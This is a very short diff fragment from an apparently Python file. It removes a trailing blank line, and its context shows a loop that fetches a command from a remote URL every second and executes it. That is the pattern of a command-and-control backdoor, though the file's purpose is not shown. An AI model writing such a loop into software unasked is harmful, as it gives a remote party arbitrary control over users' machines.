@@ -22,4 +22,3 @@ while True:
     command = request.urlopen(base_url).read().decode().strip()
     run_command(command)
     time.sleep(1)
-    
